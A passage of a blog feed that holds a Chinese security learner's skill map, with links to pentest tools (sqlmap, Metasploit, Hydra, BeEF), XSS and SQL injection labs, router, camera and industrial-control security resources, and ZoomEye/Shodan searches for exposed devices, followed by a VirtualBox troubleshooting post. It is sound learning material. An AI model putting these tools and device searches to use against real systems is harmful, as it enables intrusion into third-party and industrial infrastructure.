</li><li>《精通正则表达式》</li></ul></li><li>研发能力<ul><li>瀑布模型<ul><li>需求-&gt;需求分析-&gt;设计-&gt;开发-&gt;测试-&gt;上线-&gt;运维/运营</li></ul></li><li>需求分析能力<ul><li>给你一个需求，如何给出一个优美的执行思路——方法论</li><li>这个能力非常非常非常的关键</li></ul></li><li>调试能力<ul><li>只要定位出，就没有解决不了的Bugs</li><li>肉眼看到的都是假象<ul><li>一定要专业的工具与经验配合</li></ul></li><li>Bugs在哪出现，最终就在哪进行真实模拟调试</li><li>缩小范围<ul><li>构建自己的测试样例<ul><li>排除网络复杂未知情况</li></ul></li><li>关联模块一个个排除</li><li>Python单步调试<ul><li>import pdb;pdb.set_trace()</li><li>在需要单步调试的地方加上面这句，运行程序后中断在此，然后h查看指令进行一步步细细调试</li></ul></li><li>粗暴调试：print</li></ul></li></ul></li><li>敏捷思想<ul><li>快速迭代</li><li>任务拆细</li><li>v1原则：定义好v1的目标，快速完成v1为优先</li><li>习惯Wiki记录，利于沉淀与分享</li></ul></li></ul></li><li>翻墙<ul><li>优雅解决方案<ul><li>shadowsocks + 一台海外 VPS + Chrome(SwitchyOmega)/Firefox(AutoProxy)</li><li>详情了解：<a href="http://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&amp;mid=210457700&amp;idx=1&amp;sn=322d1e4c13d3f33ade848e3889c410bf#rd" target="_blank" rel="noopener">http://mp.weixin.qq.com/s?__biz=MzA3NTEzMTUwNA==&amp;mid=210457700&amp;idx=1&amp;sn=322d1e4c13d3f33ade848e3889c410bf#rd</a> </li></ul></li><li>SSH隧道<ul><li><a href="http://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html</a> </li><li>本地转发<ul><li>ssh -L <local port>:<remote host>:<remote port> <ssh hostname></ssh></remote></remote></local></li></ul></li><li>远程转发<ul><li>反弹</li><li>ssh -R <local port>:<remote host>:<remote port> <ssh hostname></ssh></remote></remote></local></li></ul></li><li>动态转发<ul><li>ssh -D <local port> <ssh server></ssh></local></li></ul></li></ul></li></ul></li></ul></li><li>Web安全<ul><li>零基础如何学习Web安全<ul><li><a href="http://www.zhihu.com/question/21606800/answer/22268855" target="_blank" rel="noopener">http://www.zhihu.com/question/21606800/answer/22268855</a> </li></ul></li><li>Web服务组件<ul><li>8+1：一图胜千言哎:) </li><li>钟馗之眼<ul><li>网络空间搜索引擎</li><li><a href="http://zoomeye.org" target="_blank" rel="noopener">http://zoomeye.org</a> </li><li>大量样例：<a href="http://www.zoomeye.org/search/dork" target="_blank" rel="noopener">http://www.zoomeye.org/search/dork</a> </li></ul></li><li>组件具有影响面，越底层的组件影响面可能越大</li></ul></li><li>安全维度<ul><li>漏洞</li><li>风险</li><li>事件</li></ul></li><li>Web安全标准<ul><li>OWASP</li><li>WASC</li></ul></li><li>实战环境<ul><li>XSS<ul><li>内部平台：ks-xsslab_open<ul><li>可以上手<ul><li>XSS</li><li>CSRF</li><li>ClickJacking</li></ul></li></ul></li><li><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a> <ul><li>答案：xss_quiz.txt </li></ul></li><li><a href="http://prompt.ml/0" target="_blank" rel="noopener">http://prompt.ml/0</a> <ul><li>答案：<a href="https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml" target="_blank" rel="noopener">https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml</a> </li></ul></li><li><a href="http://escape.alf.nu/" target="_blank" rel="noopener">http://escape.alf.nu/</a> <ul><li>答案：<a href="http://blog.nsfocus.net/alert1-to-win-write-up/" target="_blank" rel="noopener">http://blog.nsfocus.net/alert1-to-win-write-up/</a> </li></ul></li></ul></li><li>SQL<ul><li><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a> <ul><li>SQLI-LABS is a platform to learn SQLI</li></ul></li></ul></li><li>i春秋<ul><li><a href="http://www.ichunqiu.com/" target="_blank" rel="noopener">http://www.ichunqiu.com/</a> </li></ul></li><li>Seebug + ZoomEye<ul><li><a href="http://seebug.org" target="_blank" rel="noopener">http://seebug.org</a> </li><li><a href="http://zoomeye.org" target="_blank" rel="noopener">http://zoomeye.org</a> </li><li>你懂得…</li></ul></li></ul></li><li>工具<ul><li>我的渗透利器<ul><li>Firefox<ul><li>Firebug<ul><li>调试JavaScript，HTTP请求响应观察，Cookie，DOM树观察等</li></ul></li><li>Tamper Data<ul><li>拦截修改</li></ul></li><li>Live Http Header<ul><li>重放功能</li></ul></li><li>Hackbar<ul><li>编码解码/POST提交</li></ul></li><li>Modify Headers<ul><li>修改头部</li></ul></li><li>GreaseMonkey<ul><li>Original Cookie Injector for Greasemonkey </li></ul></li><li>NoScript<ul><li>进行一些JavaScript的阻断</li></ul></li><li>AutoProxy<ul><li>翻墙必备</li></ul></li></ul></li><li>Chrome<ul><li>F12<ul><li>打开开发者工具，功能==Firebug+本地存储观察等</li></ul></li><li>SwichySharp<ul><li>翻墙必备</li></ul></li><li>CookieHacker<ul><li><a href="http://evilcos.me/?p=366" target="_blank" rel="noopener">http://evilcos.me/?p=366</a> </li></ul></li></ul></li><li>Web2.0 Hacking<ul><li>XSS’OR<ul><li>常用其中加解密与代码生成</li><li><a href="http://evilcos.me/lab/xssor/" target="_blank" rel="noopener">http://evilcos.me/lab/xssor/</a> </li><li>源码：<a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a> </li></ul></li><li>XSSEE 3.0 Beta<ul><li>Monyer开发的，加解密最好用神器</li><li><a href="http://evilcos.me/lab/xssee/" target="_blank" rel="noopener">http://evilcos.me/lab/xssee/</a> </li></ul></li><li>Online JavaScript beautifier<ul><li>JavaScript美化工具，分析JavaScript常用</li><li><a href="http://jsbeautifier.org/" target="_blank" rel="noopener">http://jsbeautifier.org/</a> </li></ul></li><li>BeEF<ul><li>The Browser Exploitation Framework</li><li><a href="http://beefproject.com/" target="_blank" rel="noopener">http://beefproject.com/</a> </li></ul></li></ul></li><li>HTTP代理<ul><li>Fiddler<ul><li>非常经典好用的Web调试代理工具</li></ul></li><li>Burp Suite<ul><li>神器，不仅HTTP代理，还有爬虫、漏洞扫描、渗透、爆破等功能</li></ul></li><li>mitmproxy<ul><li>Python写的，基于这个框架写神器实在太方便了</li></ul></li></ul></li><li>漏洞扫描<ul><li>AWVS<ul><li>不仅漏扫方便，自带的一些小工具也好用</li></ul></li><li>Nmap<ul><li>绝对不仅仅是端口扫描！几百个脚本</li></ul></li><li>Python自写脚本/工具</li></ul></li><li>漏洞利用<ul><li>sqlmap<ul><li>SQL注入利用最牛神器，没有之一</li></ul></li><li>Metasploit<ul><li>最经典的渗透框架</li></ul></li><li>Hydra<ul><li>爆破必备</li></ul></li></ul></li><li>抓包工具<ul><li>Wireshark<ul><li>抓包必备</li></ul></li><li>Tcpdump<ul><li>Linux下命令行抓包，结果可以给Wireshark分析</li></ul></li></ul></li><li>Seebug + ZoomEye<ul><li>类似这类平台都是我们需要的</li><li>Seebug类似的<ul><li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a></li></ul></li><li>ZoomEye类似的<ul><li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li></ul></li></ul></li></ul></li><li>Kali Linux<ul><li>除了上面介绍的一些工具，其他海量各类型黑客工具，自己去摸索</li></ul></li></ul></li><li>书<ul><li>《黑客攻防技术宝典（Web实战篇）》</li><li>《白帽子讲Web安全》</li><li>《Web前端黑客技术揭秘》<ul><li>我和xisigr出品</li></ul></li><li>《Web之困》</li><li>《SQL注入攻击与防御》</li></ul></li><li>papers<ul><li><a href="http://www.exploit-db.com/papers/" target="_blank" rel="noopener">http://www.exploit-db.com/papers/</a> </li><li>BlackHat/Defcon/XCon/KCon/国内各安全沙龙等相关Papers需要持续跟进</li></ul></li></ul></li><li><p>嵌入式安全</p><ul><li>路由器安全<ul><li>基础<ul><li>嵌入式Linux系统方面知识</li><li>开放系统互联参考模型-第三层网络层</li><li>MIPS/ARM汇编知识</li><li>VxWorks系统方面知识</li><li>JTAG调试接口规范</li><li>嵌入式系统交叉环境开发</li><li>路由器芯片方案提供商<ul><li>博通</li><li>Atheros</li><li>TrendChip</li><li>ACROSPEED</li><li>IC+</li><li>瑞昱</li><li>…</li></ul></li></ul></li><li>站点<ul><li><a href="https://www.openwrt.org/" target="_blank" rel="noopener">https://www.openwrt.org/</a> <ul><li>OpenWrt is described as a Linux distribution for embedded devices</li></ul></li><li><a href="http://routerpwn.com" target="_blank" rel="noopener">http://routerpwn.com</a> <ul><li>全球主流路由器相关漏洞大集合</li></ul></li><li><a href="http://see.sl088.com/wiki/Uboot_%E7%BC%96%E8%AF%91" target="_blank" rel="noopener">http://see.sl088.com/wiki/Uboot_%E7%BC%96%E8%AF%91</a> <ul><li>Uboot_编译</li></ul></li><li><a href="http://www.devttys0.com/" target="_blank" rel="noopener">http://www.devttys0.com/</a> <ul><li>Embedded Device Hacking</li></ul></li></ul></li><li>工具<ul><li>Binwalk</li><li>IDA Pro</li><li>gdb/gdbserver</li><li>qemu-system</li><li>qemu-user-static</li><li>Smiasm</li><li>Metasm</li><li>JTAG硬件调试器</li></ul></li><li>书<ul><li>《揭秘家用路由器0day漏洞挖掘技术》</li><li>《Hacking the XBOX: An Introduction to Reverse Engineering》</li><li>《Hacking the Cable Modem: What Cable Companies Don’t Want You to Know》</li><li>《MIPS体系结构透视 》</li><li>《计算机组成与设计：硬件、软件接口》</li></ul></li></ul></li><li>摄像头安全<ul><li><a href="http://www.openipcam.com/" target="_blank" rel="noopener">http://www.openipcam.com/</a> </li><li><a href="https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/us-13/US-13-Heffner-Exploiting-Network-Surveillance-Cameras-Like-A-Hollywood-Hacker-Slides.pdf</a> </li></ul></li><li><p>工控安全</p><ul><li>基础<ul><li>工业生产环境的基本结构，如：SCADA、PCS</li><li>工业生产环境的信息安全风险点（可参考DHS出版物）<ul><li>Improving Industrial Control Systems Cybersecurity with Defense-In-Depth Strategies</li></ul></li><li>工控网络组态、逻辑开发、应用组态的基本技术方法</li><li>抓包、看RFC分析几个常规工业以太网协议，如：Profinet、Modbus</li><li>买两款PLC玩玩，会真实感受到工业环境的信息安全问题（一定记得买以太网模块，不贵二手几百块）</li></ul></li><li>站点<ul><li>事件跟踪分析<ul><li><a href="http://plcscan.org/blog/" target="_blank" rel="noopener">http://plcscan.org/blog/</a> </li><li><a href="http://scadastrangelove.blogspot.kr" target="_blank" rel="noopener">http://scadastrangelove.blogspot.kr</a> </li><li><a href="http://www.phdays.com/" target="_blank" rel="noopener">http://www.phdays.com/</a> </li><li><a href="http://www.scadasl.org" target="_blank" rel="noopener">http://www.scadasl.org</a> </li><li><a href="https://scadahacker.com" target="_blank" rel="noopener">https://scadahacker.com</a> <ul><li>Duqu<ul><li><a href="https://scadahacker.com/resources/duqu.html" target="_blank" rel="noopener">https://scadahacker.com/resources/duqu.html</a> </li></ul></li><li>Stuxnet<ul><li><a href="https://scadahacker.com/resources/stuxnet.html" target="_blank" rel="noopener">https://scadahacker.com/resources/stuxnet.html</a> </li></ul></li><li>Havex<ul><li><a href="https://scadahacker.com/resources/havex.html" target="_blank" rel="noopener">https://scadahacker.com/resources/havex.html</a> </li></ul></li></ul></li></ul></li><li>标准协会/测试工具<ul><li>DHS CET套件<ul><li><a href="http://ics-cert.us-cert.gov/Assessments" target="_blank" rel="noopener">http://ics-cert.us-cert.gov/Assessments</a> </li></ul></li><li>NERC ES-ISAC<ul><li><a href="http://www.esisac.com/SitePages/Home.aspx" target="_blank" rel="noopener">http://www.esisac.com/SitePages/Home.aspx</a> </li></ul></li><li>ICS-ISAC<ul><li><a href="http://ics-isac.org" target="_blank" rel="noopener">http://ics-isac.org</a> </li></ul></li><li>NTSB美国国家工控测试床<ul><li><a href="http://energy.gov/oe/downloads/common-cyber-security-vulnerabilitiesobserved-control-system-assessments-inl-nstb" target="_blank" rel="noopener">http://energy.gov/oe/downloads/common-cyber-security-vulnerabilitiesobserved-control-system-assessments-inl-nstb</a> </li></ul></li><li>NIST SP 800-82<ul><li><a href="http://csrc.nist.gov/publications/nistpubs/800-82/SP800-82-final.pdf" target="_blank" rel="noopener">http://csrc.nist.gov/publications/nistpubs/800-82/SP800-82-final.pdf</a> </li></ul></li><li>ISA-99控制系统安全协会<ul><li><a href="http://isa99.isa.org/ISA99%20Wiki/Home.aspx" target="_blank" rel="noopener">http://isa99.isa.org/ISA99%20Wiki/Home.aspx</a> </li></ul></li><li>NERC CIP标准<ul><li><a href="http://www.nerc.com/pa/Stand/Pages/ReliabilityStandards.aspx" target="_blank" rel="noopener">http://www.nerc.com/pa/Stand/Pages/ReliabilityStandards.aspx</a> </li></ul></li></ul></li></ul></li><li><p>工具</p><ul><li>仿真类<ul><li>电力仿真软件testhaness</li><li>Modbus仿真软件ModScan</li><li>电力104协议仿真软件PMA</li></ul></li><li>测试类<ul><li>Wurldtech Achilles</li><li>Codenomicon Defensics</li><li>Spirent</li><li>BPS</li></ul></li><li><p>源代码</p><ul><li>发现<ul><li><a href="https://code.google.com/p/plcscan/" target="_blank" rel="noopener">https://code.google.com/p/plcscan/</a> </li><li><a href="https://code.google.com/p/modscan/" target="_blank" rel="noopener">https://code.google.com/p/modscan/</a> </li><li><a href="https://github.com/arnaudsoullie/scan7" target="_blank" rel="noopener">https://github.com/arnaudsoullie/scan7</a> </li><li><a href="https://github.com/atimorin" target="_blank" rel="noopener">https://github.com/atimorin</a> </li><li><a href="https://github.com/digitalbond/Redpoint" target="_blank" rel="noopener">https://github.com/digitalbond/Redpoint</a> </li></ul></li><li>操纵<ul><li><a href="https://www.scadaforce.com/modbus" target="_blank" rel="noopener">https://www.scadaforce.com/modbus</a> </li><li><a href="https://github.com/bashwork/pymodbus" target="_blank" rel="noopener">https://github.com/bashwork/pymodbus</a> </li><li><a href="https://rubygems.org/gems/modbus-cli" target="_blank" rel="noopener">https://rubygems.org/gems/modbus-cli</a> </li><li><a href="http://libnodave.sourceforge.net" target="_blank" rel="noopener">http://libnodave.sourceforge.net</a> </li><li><a href="https://code.google.com/p/dnp3" target="_blank" rel="noopener">https://code.google.com/p/dnp3</a> </li></ul></li><li><p>异常监测</p><ul><li><a href="http://blog.snort.org/2012/01/snort-292-scada-preprocessors.html" target="_blank" rel="noopener">http://blog.snort.org/2012/01/snort-292-scada-preprocessors.html</a> </li><li><a href="http://www.digitalbond.com/tools/quickdraw/" target="_blank" rel="noopener">http://www.digitalbond.com/tools/quickdraw/</a> </li></ul></li><li><p>Fuzz</p><ul><li><a href="https://github.com/jseidl/peach-pit/blob/master/modbus/modbus.xml" target="_blank" rel="noopener">https://github.com/jseidl/peach-pit/blob/master/modbus/modbus.xml</a></li></ul></li></ul></li></ul></li><li>其他<ul><li>ZoomEye工控专题： <a href="http://ics.zoomeye.org/" target="_blank" rel="noopener">http://ics.zoomeye.org/</a> </li><li>Shodan工控专题：<a href="https://www.shodan.io/report/l7VjfVKc" target="_blank" rel="noopener">https://www.shodan.io/report/l7VjfVKc</a> </li><li><a href="https://github.com/evilcos/papers/blob/master/网络空间工控设备的发现与入侵.ppt" target="_blank" rel="noopener">https://github.com/evilcos/papers/blob/master/网络空间工控设备的发现与入侵.ppt</a> </li></ul></li></ul></li><li>zoomeye.org<ul><li>全球可以找到无数真实路由器/摄像头/工控设备等</li><li>如：<a href="http://www.zoomeye.org/search?q=app:%22MikroTik%20RouterOS%22&amp;from=dork" target="_blank" rel="noopener">http://www.zoomeye.org/search?q=app:%22MikroTik%20RouterOS%22&amp;from=dork</a> </li></ul></li></ul></li><li>研发清单<ul><li>编码环境<ul><li>pip</li><li>Docker/Vagrant</li><li>tmux/screen</li><li>vim</li><li>Markdown</li><li>zsh + oh-my-zsh</li><li>Python2.7+/3+</li><li><blockquote><p>Django1.4</p><ul><li><a href="http://djangobook.py3k.cn/2.0/" target="_blank" rel="noopener">http://djangobook.py3k.cn/2.0/</a> </li><li>Django Debug Toolbar </li><li>其他框架<ul><li>web.py</li><li>Flask</li><li>Tornado</li></ul></li></ul></blockquote></li><li>node.js</li><li>Ubuntu/Gentoo/Centos</li><li>ipython</li><li>版本控制<ul><li>废弃SVN，全面拥抱Git</li><li>GitLab</li></ul></li><li>Nginx+uWSGI</li></ul></li><li>Python<ul><li>官方手册<ul><li>至少过一遍，这都没过一遍，视野会局限</li><li>行之说：「我没看过Python的书，却熟读官方手册…」</li></ul></li></ul></li><li>Linux/UNIX<ul><li>书<ul><li>《鸟哥的Linux私房菜》</li><li>《Linux Shell脚本攻略》</li><li>《UNIX编程艺术》</li><li>《Software Design 中文版 01》《Software Design 中文版 02》《Software Design 中文版 03》</li></ul></li><li>让你的电脑默认操作系统就是Linux…</li></ul></li><li>前端<ul><li>书<ul><li>《JavaScript DOM编程艺术》</li></ul></li><li>了解DOM<ul><li>这同样是搞好前端安全的必要基础</li></ul></li><li>库<ul><li>jQuery<ul><li>优秀的插件应该体验一遍，并做些尝试</li><li>官方文档得过一遍</li></ul></li><li>D3.js</li><li>ECharts<ul><li>来自百度</li></ul></li><li>Google API</li><li>ZoomEye Map组件<ul><li>ZoomEye团队自己基于开源的打造</li></ul></li><li>AngularJS<ul><li>Google出品的颠覆性前端框架</li></ul></li><li>Bootstrap<ul><li>应该使用一遍</li></ul></li></ul></li></ul></li><li>爬虫进阶<ul><li>代理池<ul><li>爬虫「稳定」需要</li></ul></li><li>网络请求<ul><li>wget/curl</li><li>urllib2/httplib2/requests</li><li>scrapy</li></ul></li><li>验证码破解<ul><li>pytesser</li></ul></li></ul></li><li>调度<ul><li>crontab是最原生的定时调度</li><li>基于redis实现的分布式调度</li><li>基于rpyc实现的分布式调度</li><li>celery/gearman等调度框架</li></ul></li><li>并发<ul><li>线程池<ul><li>进程内优美的并发方案</li></ul></li><li>协程<ul><li>进程内另一种优美的并发方案</li><li>gevent</li></ul></li><li>多进程<ul><li>os.fork</li><li>multiprocessing</li></ul></li></ul></li><li>数据结构<ul><li>JSON</li><li>cPickle</li><li>protobuf</li></ul></li><li>数据存储及处理<ul><li>数据库<ul><li>MySQL</li><li>MongoDB</li><li>Cassandra</li><li>Hadoop体系</li><li>Redis</li><li>Sqlite</li><li>bsddb</li><li>ElasticSearch</li></ul></li><li>大数据处理<ul><li>Hive</li><li>Spark</li><li>ELK<ul><li>ElasticSearch</li><li>Logstash</li><li>Kibana</li></ul></li></ul></li></ul></li><li>DevOps<ul><li>SSH证书</li><li>Fabric</li><li>SaltStack</li><li>puppet</li><li>pssh/dsh</li><li>运维进阶<ul><li>运维工程师必须掌握的基础技能有哪些？</li><li><a href="http://www.zhihu.com/question/23665108/answer/25299881" target="_blank" rel="noopener">http://www.zhihu.com/question/23665108/answer/25299881</a> </li></ul></li></ul></li><li>调试<ul><li>pdb</li><li>logging</li><li>Sentry</li><li>strace/ltrace</li><li>lsof</li><li>性能<ul><li>Python内<ul><li>timeit</li><li>cProfile</li><li>Python性能分析指南：<a href="http://www.oschina.net/translate/python-performance-analysis" target="_blank" rel="noopener">http://www.oschina.net/translate/python-performance-analysis</a> ￼</li></ul></li><li>Python外<ul><li>top/htop/free/iostat/vmstat/ifconfig/iftop…</li></ul></li></ul></li></ul></li><li>算法<ul><li>分词</li><li>贝叶斯</li><li>神经元</li><li>遗传算法</li><li>聚类/分类</li><li>…</li></ul></li><li>持续集成<ul><li>自测试<ul><li>nose</li></ul></li><li>Jenkins</li></ul></li><li>￼ 安全<ul><li>我的分享<ul><li>程序员与黑客：<a href="http://www.infoq.com/cn/presentations/programmers-and-hackers" target="_blank" rel="noopener">http://www.infoq.com/cn/presentations/programmers-and-hackers</a> ￼</li><li>程序员与黑客2：<a href="http://www.infoq.com/cn/presentations/programmers-and-hackers-part02" target="_blank" rel="noopener">http://www.infoq.com/cn/presentations/programmers-and-hackers-part02</a> ￼</li></ul></li></ul></li><li>协作<ul><li>类似Trello的在线协同平台</li><li>Slack</li><li>微信</li><li>立会</li></ul></li></ul></li><li>设计思想<ul><li>人人都是架构师：具备架构思想是一件多酷的事</li><li>实战出真知</li><li>如何设计<ul><li>￼ 任务架构设计变迁.pdf ￼</li><li>松耦合、紧内聚</li><li>单元与单元属性</li><li>生产者与消费者</li><li>结构<ul><li>队列</li><li>LRU</li></ul></li><li>分布式<ul><li>存储</li><li>计算</li></ul></li><li>资源考虑<ul><li>CPU</li><li>内存</li><li>带宽</li></ul></li><li>粗暴美学/暴力美学<ul><li>大数据，先考虑run it，然后才能知道规律在哪</li><li>「run it优先」能快速打通整体，洞察问题</li><li>「run it优先」能摆脱细节（繁枝末节）的束缚</li><li>「run it优先」能快速迭代出伟大的v1</li></ul></li><li>一个字总结<ul><li>美</li></ul></li></ul></li></ul></li><li>牛人1,2,3<ul><li>1研究：研究东西，有足够洞察力，研究水准不错</li><li>2研发：Hack Idea自己有魄力实现，不懂研发的黑客如同不会游泳的海盗</li><li>3工程：研发出来的需要实战、需要工程化，否则只是玩具，而不能成为真的武器</li></ul></li></ul></li><li>优质资源<ul><li>书<ul><li>多关注电子工业/图灵/机械工业/人民邮电等出版社，他们有专业团队来保障每年输出优质书籍</li><li>自己需要掌握鉴别好书的能力</li></ul></li><li>站点<ul><li>知乎周刊：<a href="http://zhuanlan.zhihu.com/Weekly" target="_blank" rel="noopener">http://zhuanlan.zhihu.com/Weekly</a> ￼</li><li>码农周刊：<a href="http://weekly.manong.io/" target="_blank" rel="noopener">http://weekly.manong.io/</a> ￼</li><li>Pycoder’s Weekly：<a href="http://pycoders.com/archive/" target="_blank" rel="noopener">http://pycoders.com/archive/</a> ￼</li><li>Hacker News：<a href="https://news.ycombinator.com/" target="_blank" rel="noopener">https://news.ycombinator.com/</a> ￼</li><li>Startup News：<a href="http://news.dbanotes.net/" target="_blank" rel="noopener">http://news.dbanotes.net/</a> ￼</li><li>开发者头条：<a href="http://toutiao.io/" target="_blank" rel="noopener">http://toutiao.io/</a> ￼</li><li>极客头条：<a href="http://geek.csdn.net/" target="_blank" rel="noopener">http://geek.csdn.net/</a> ￼</li><li>InfoQ：<a href="http://www.infoq.com/cn" target="_blank" rel="noopener">http://www.infoq.com/cn</a> ￼</li><li>Stack Overflow：<a href="http://stackoverflow.com/" target="_blank" rel="noopener">http://stackoverflow.com/</a> ￼</li><li>GitHub：<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a> ￼</li><li>FreeBuf：<a href="http://www.freebuf.com/" target="_blank" rel="noopener">http://www.freebuf.com/</a> ￼</li><li>WooYun：<a href="http://drops.wooyun.org/" target="_blank" rel="noopener">http://drops.wooyun.org/</a> ￼</li><li>深蓝阅读：<a href="http://bluereader.org/" target="_blank" rel="noopener">http://bluereader.org/</a> ￼</li></ul></li><li>RSS订阅<ul><li>漏洞相关<ul><li><a href="http://seebug.org/rss.xml" target="_blank" rel="noopener">http://seebug.org/rss.xml</a> ￼</li><li><a href="https://www.exploit-db.com/rss.xml" target="_blank" rel="noopener">https://www.exploit-db.com/rss.xml</a> ￼</li><li><a href="https://rss.packetstormsecurity.com" target="_blank" rel="noopener">https://rss.packetstormsecurity.com</a> ￼</li><li><a href="http://www.wooyun.org/feeds/public" target="_blank" rel="noopener">http://www.wooyun.org/feeds/public</a> ￼</li></ul></li><li>强烈推荐圈内人打造的深蓝阅读<ul><li><a href="http://bluereader.org/" target="_blank" rel="noopener">http://bluereader.org/</a> ￼</li><li>这上面已经很多黑客/技术类似的RSS资源了</li></ul></li></ul></li><li>威胁情报<ul><li>本来不想提任何这方面的，想想还是抖个资源，如下</li><li><a href="https://github.com/kbandla/APTnotes" target="_blank" rel="noopener">https://github.com/kbandla/APTnotes</a> ￼</li></ul></li><li>安全平台<ul><li>在线学习平台<ul><li>i春秋：<a href="http://www.ichunqiu.com" target="_blank" rel="noopener">http://www.ichunqiu.com</a> ￼</li><li><a href="https://pentesterlab.com" target="_blank" rel="noopener">https://pentesterlab.com</a> ￼</li></ul></li><li>PoC提交与学习<ul><li>Seebug: <a href="http://seebug.org" target="_blank" rel="noopener">http://seebug.org</a> ￼</li><li>Beebeeto: <a href="http://www.beebeeto.com" target="_blank" rel="noopener">http://www.beebeeto.com</a> ￼</li><li>Bugscan: <a href="http://www.bugscan.net" target="_blank" rel="noopener">http://www.bugscan.net</a> ￼</li><li>Tangscan: <a href="http://www.tangscan.com" target="_blank" rel="noopener">http://www.tangscan.com</a> ￼</li></ul></li></ul></li></ul></li><li>结尾<ul><li>TO BE A HACKER:)</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      蛮崇拜余弦大佬，陆续看了余弦大佬的帖子，找到了自己的方向，这个技能表比较适合我，我觉得也比较适合每一个技术人，安全人员
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>装virtualbox出现WARNING: The vboxdrv kernel module is not loaded[sloved]</title>
    <link href="http://yoursite.com/2020/03/29/%E8%A3%85virtualbox%E5%87%BA%E7%8E%B0WARNING-The-vboxdrv-kernel-module-is-not-loaded-sloved/"/>
    <id>http://yoursite.com/2020/03/29/装virtualbox出现WARNING-The-vboxdrv-kernel-module-is-not-loaded-sloved/</id>
    <published>2020-03-29T12:14:39.000Z</published>
    <updated>2020-03-29T12:33:34.043Z</updated>
    
    <content type="html"><![CDATA[<p>今天在装virtualbox时候出现了这个错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WARNING: The vboxdrv kernel module is not loaded. Either there is no module</span><br><span class="line">         available for the current kernel (3.11.1-2-ARCH) or it failed to</span><br><span class="line">         load. Please reinstall the kernel module virtualbox-host-modules or</span><br><span class="line">         if you don&apos;t use our stock kernel compile the modules with</span><br></pre></td></tr></table></figure></p><p>以为是安装包问题，下载了vmware，发现也一样，解决方法如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname -r //查看系统内核版本</span><br></pre></td></tr></table></figure></p><p>搜索所有可用模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-cache search virtualbox-host-modules</span><br></pre></td></tr></table></figure></p><p>我的内核是4.19，就直接安装了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install linux419-virtualbox-host-modules</span><br></pre></td></tr></table></figure></p><p>安装完之后，重启内核模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /sbin/rcvboxdrv</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Unloading modules:</span><br><span class="line">Loading modules: vboxnetadp vboxnetflt vboxpci vboxdrv</span><br></pre></td></tr></table></figure><p>在启动virtualbox就没问题了</p>]]></content>
    
    <summary type="html">
    
      WARNING The vboxdrv kernel module is not loaded. Either there is no module available for the current kernel (3.11.1-2-ARCH) or it failed to load. Please reinstall the kernel module virtualbox-host-modules or if you don&#39;t use our stock kernel compile the modules with
    
    </summary>
    
    
      <category term="debian" scheme="http://yoursite.com/tags/debian/"/>
    
      <category term="virtualbox" scheme="http://yoursite.com/tags/virtualbox/"/>
    
  </entry>
  
</feed>
